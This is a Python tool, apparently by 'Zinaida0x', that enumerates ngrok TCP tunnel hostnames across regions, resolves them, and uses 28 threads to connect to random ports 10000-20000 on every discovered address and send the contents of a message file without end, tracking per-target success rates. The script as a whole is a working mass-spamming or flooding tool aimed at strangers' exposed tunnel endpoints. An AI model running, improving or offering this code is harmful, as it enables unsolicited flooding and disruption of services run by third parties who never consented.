import os
import sys
import subprocess
import threading
import random
import socket
import queue
import time
from time import sleep
from colorama import Fore, Style, init
from tqdm import tqdm

init(autoreset=True)

class Color:
    BLUE = '\033[94m'
    GREEN = '\033[1;92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    ORANGE = '\033[38;5;208m'
    BOLD = '\033[1m'
    UNBOLD = '\033[22m'
    ITALIC = '\033[3m'
    UNITALIC = '\033[23m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def loading_animation(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        sleep(0.01)
    print()

def display_menu():
    title = """
███████╗██╗███╗   ██╗ █████╗ ██╗██████╗  █████╗  ██████╗ ██╗  ██╗
╚══███╔╝██║████╗  ██║██╔══██╗██║██╔══██╗██╔══██╗██╔═████╗╚██╗██╔╝
  ███╔╝ ██║██╔██╗ ██║███████║██║██║  ██║███████║██║██╔██║ ╚███╔╝ 
 ███╔╝  ██║██║╚██╗██║██╔══██║██║██║  ██║██╔══██║████╔╝██║ ██╔██╗ 
███████╗██║██║ ╚████║██║  ██║██║██████╔╝██║  ██║╚██████╔╝██╔╝ ██╗
╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
    """
    for line in title.splitlines():
        colored_line = Color.ORANGE + Style.BRIGHT + line
        print(colored_line)
        time.sleep(0.1)

    print(Fore.WHITE + Style.BRIGHT + "─" * 65)
    border_color = Color.CYAN + Style.BRIGHT
    option_color = Fore.WHITE + Style.BRIGHT

    print(border_color + "┌" + "─" * 63 + "┐")

# Constants
c_upper_bound = 10
c_port_range = (10000, 20000)
c_resolvers = 4
c_senders = 28
c_timeout = 5
c_message = open("message.txt", "rb").read()
c_countries = ["ap", "au", "eu", "in", "jp", "sa", "us", "us-cal-1"]

class Target:
    def __init__(self, address, reset=60):
        self.last_reset = time.time()
        self.address = address
        self.reset = reset
        self.ports = set()
        self.tries = 0
        self.sent = 0

    def time_until_reset(self):
        return self.reset - (time.time() - self.last_reset)

    def check_reset(self):
        if self.time_until_reset() <= 0:
            self.ports.clear()
            self.tries = 0
            self.sent = 0
            self.last_reset = time.time()

    def _send(self, message, port, timeout=5):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)

        if sock.connect_ex((self.address, port)):
            sock.close()
            return False

        try:
            sock.sendall(message)
            sock.close()
            return True
        except Exception:
            return False

    def send(self, message, port=None, timeout=5):
        self.check_reset()
        self.tries += 1

        if self._send(message, port, timeout):
            self.ports.add(port)
            self.sent += 1
            return True
        else:
            return False

    def get_success_rate(self):
        if self.tries > 0:
            return self.sent / self.tries
        else:
            return 0.5

    def __hash__(self):
        return hash(self.address)

    def __eq__(self, value):
        if isinstance(value, self.__class__):
            return self.address == value.address
        else:
            return self == value

class _State:
    task_queue = queue.Queue(512)
    addresses = set()
    running = True
    tries = 0
    sent = 0

g_state = _State()

def build_node_url(country, index=0, protocol="tcp"):
    return f"{index}.{protocol}.{country}.ngrok.io"

def build_domains(upper_bound):
    return [build_node_url(c, i) for c in c_countries for i in range(upper_bound)]

def resolve_hostname(domain):
    try:
        return socket.gethostbyname_ex(domain)[2]
    except Exception as e:
        print(f"Error resolving {domain}: {e}")  # Log error for debugging
        return []

def resolving_worker():
    global g_state

    task_queue = g_state.task_queue
    addresses = g_state.addresses

    while g_state.running:
        try:
            domain = task_queue.get(timeout=1)  # Added timeout to prevent blocking indefinitely
            resolved_addresses = resolve_hostname(domain)
            if resolved_addresses:
                addresses.update([Target(address) for address in resolved_addresses])
        except queue.Empty:
            continue
        except Exception as e:
            print(f"Error in resolving worker: {e}")  # Log error for debugging
            continue

def sending_worker():
    global g_state

    addresses = g_state.addresses

    time.sleep(random.random() * (c_senders / 16) + 1)
    while g_state.running:
        if len(g_state.addresses) == 0:
            continue
        
        address_list = list(addresses)
        target = random.choices(address_list, [max(0.01, target.get_success_rate()) for target in address_list])[0]

        g_state.tries += 1

        if target.send(c_message, random.randint(*c_port_range), c_timeout) == True:
            g_state.sent += 1

def worker_assigner():
    global g_state

    task_queue = g_state.task_queue
    
    while g_state.running:
        for domain in build_domains(c_upper_bound):
            task_queue.put(domain)

        time.sleep(5)

def main():
    global g_state
    
    clear_screen()
    display_menu()

    resolving_workers = []
    for _ in range(c_resolvers):
        thread = threading.Thread(target=resolving_worker)
        thread.start()
        resolving_workers.append(thread)

    sending_workers = []
    for _ in range(c_senders):
        thread = threading.Thread(target=sending_worker)
        thread.start()
        sending_workers.append(thread)

    assigner = threading.Thread(target=worker_assigner)
    assigner.start()

    made_by = f"{Fore.CYAN}[Zinaida0x]{Style.RESET_ALL}"

    try:
        total = tqdm(unit="msg", total=0, position=0)
        bars = []

        while g_state.running:
            time.sleep(0.05)

            total.set_postfix({
                "made_by": made_by,
                "tries": g_state.tries,
                "nodes": len(g_state.addresses)
            })
            total.n = g_state.sent
            total.refresh()

            # Refresh individual bars more frequently
            for idx, node in enumerate(sorted(list(g_state.addresses), key=lambda x: x.get_success_rate(), reverse=True)):
                if idx + 1 > len(bars):
                    bars.append(tqdm(unit="msg", total=0, position=len(bars) + 1))

                bar = bars[idx]
                bar.set_postfix({
                    "made_by": made_by,
                    "reset": f"{max(0, node.time_until_reset()):04.1f}s",
                    "tries": node.tries,
                    "success": f"{node.get_success_rate() * 100:.2f}%",
                    "address": node.address
                })
                bar.n = node.sent
                bar.refresh()

    except KeyboardInterrupt:
        g_state.running = False
    except Exception as e:
        print(f"Error in main loop: {e}")  # Log error for debugging
    finally:
        g_state.running = False
        for thread in resolving_workers + sending_workers:
            thread.join()
        assigner.join()

        sys.stdout.flush()

if __name__ == "__main__":
    main()
